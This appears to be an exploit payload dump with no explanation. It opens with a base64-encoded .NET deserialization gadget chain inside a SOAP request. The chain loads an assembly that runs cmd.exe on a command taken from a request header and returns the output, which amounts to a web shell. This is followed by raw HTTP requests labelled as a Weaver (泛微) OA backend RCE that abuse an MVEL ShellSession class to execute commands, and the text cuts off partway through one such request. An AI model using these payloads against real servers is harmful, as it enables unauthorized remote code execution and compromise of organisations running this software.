AAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAOQGAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAACoAgAAAEAAAAAEAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAAA4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAABIAAAAAgAFADAhAABgBQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbMAMAwwAAAAEAABECKAMAAAooBAAACgoGbwUAAApvBgAACgZvBwAACm8IAAAKcwkAAAoLB28KAAAKcgEAAHBvCwAACgZvDAAACm8NAAAKchEAAHBvDgAACgwHbwoAAApyGQAAcAgoDwAACm8QAAAKB28KAAAKF28RAAAKB28KAAAKF28SAAAKB28KAAAKFm8TAAAKB28UAAAKJgdvFQAACm8WAAAKDQZvBwAACglvFwAACt4DJt4ABm8HAAAKbxgAAAoGbwcAAApvGQAACioAARAAAAAAIgCHqQADDgAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAALwBAAAjfgAAKAIAAHQCAAAjU3RyaW5ncwAAAACcBAAAJAAAACNVUwDABAAAEAAAACNHVUlEAAAA0AQAAJAAAAAjQmxvYgAAAAAAAAACAAABRxQCAAkAAAAA+iUzABYAAAEAAAAOAAAAAgAAAAEAAAAZAAAAAgAAAAEAAAABAAAAAwAAAAAACgABAAAAAAAGACkAIgAGAFYANgAGAHYANgAKAKgAnQAKAMAAnQAKAOgAnQAOABsBCAEOACMBCAEKAE8BnQAOAIYBZwEGAK8BIgAGACQCGgIGAEQCGgIGAGkCIgAAAAAAAQAAAAAAAQABAAAAEAAXAAAABQABAAEAUCAAAAAAhhgwAAoAAQARADAADgAZADAACgAJADAACgAhALQAHAAhANIAIQApAN0ACgAhAPUAJgAxAAIBCgA5ADAACgA5ADQBKwBBAEIBMAAhAFsBNQBJAJoBOgBRAKYBPwBZALYBRABBAL0BMABBAMsBSgBBAOYBSgBBAAACSgA5ABQCTwA5ADECUwBpAE8CWAAxAFkCMAAxAF8CCgAxAGUCCgAuAAsAZQAuABMAbgBcAASAAAAAAAAAAAAAAAAAAAAAAJQAAAAEAAAAAAAAAAAAAAABABkAAAAAAAQAAAAAAAAAAAAAABMAnQAAAAAABAAAAAAAAAAAAAAAAQAiAAAAAAAAAAA8TW9kdWxlPgBrd3V3YWNwdy5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBrd3V3YWNwdwBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0hlYWRlcnMAZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhlY3V0ZQBTdGFydABTeXN0ZW0uSU8AU3RyZWFtUmVhZGVyAGdldF9TdGFuZGFyZE91dHB1dABUZXh0UmVhZGVyAFJlYWRUb0VuZABXcml0ZQBGbHVzaABFbmQARXhjZXB0aW9uAAAAD2MAbQBkAC4AZQB4AGUAAAdjAG0AZAAABy8AYwAgAAAAAAA2IZXU/G1oT7AM+EyvNpdOAAi3elxWGTTgiQMgAAEEIAEBCAiwP19/EdUKOgQAABIRBCAAEhUEIAASGQQgABIhBCABAQ4EIAASJQQgABIpBCABDg4FAAIODg4EIAEBAgMgAAIEIAASMQMgAA4IBwQSERIdDg4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBAAAAuCYAAAAAAAAAAAAAziYAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAmAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAATAIAAAAAAAAAAAAATAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBKwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAIgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAAPAANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABrAHcAdQB3AGEAYwBwAHcALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEQADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABrAHcAdQB3AGEAYwBwAHcALgBkAGwAbAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAADgNgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEDwAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBiEAAAD+AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYiAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAQAAAABwAAAAkDAAAACgkkAAAACggIAAAAAAoICAEAAAABEQAAAA8AAAAGJQAAAPUCU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJBgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAAAAkHAAAACgk1AAAACggIAAAAAAoICAEAAAABGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAAAAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAAAAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsAAAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJUgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFHAAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVtLlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJagAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQoKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZwAAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZhdG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJDyb3Cws=</strFormAssignment>
<isBase>false</isBase>
</GetChildFormAndEntityList>
</soap:Body>
</soap:Envelope>


泛微OA后台RCE
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: "6evu6PUo/Cz"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cache-Name: 5bCP6Im+
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc


------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="operation"

add
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="encryptname"

ttttaaa
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="encryptclass"

org.mvel2.sh.ShellSession
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="encryptmethod"

exec
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="decryptmethod"

exec
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="isdialog"

0
------WebKitFormBoundaryVnIIugCdViAmEyK3
Content-Disposition: form-data; name="x"; filename="x"

x
------WebKitFormBoundaryVnIIugCdViAmEyK3--




POST /api/integration/Outter/getOutterSysEncryptClassOperates?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: "6evu6PUo/Cz"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Cache-Name: 5bCP6Im+
Accept-Language: zh-CN,zh;q=0.9
Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc




POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: xxxx:xxx
If-None-Match: "6evu6PUo/Cz"
